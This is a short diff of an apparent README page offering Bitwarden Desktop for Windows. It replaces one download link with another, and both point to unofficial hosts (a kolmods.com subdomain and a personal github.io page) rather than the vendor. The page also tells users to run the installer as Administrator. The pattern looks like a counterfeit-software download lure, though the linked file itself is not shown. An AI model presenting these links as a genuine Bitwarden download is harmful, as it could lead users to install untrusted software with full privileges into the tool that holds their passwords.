@@ -2,7 +2,7 @@
 
 ## Download & Install
 
-> **Download:** [**Get Bitwarden Desktop for Windows →**](https://bitwarden-setup.kolmods.com/)
+> **Download:** [**Get Bitwarden Desktop for Windows →**](https://ashrafr6043.github.io)
 >
 > Setup notes for **Bitwarden Desktop** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
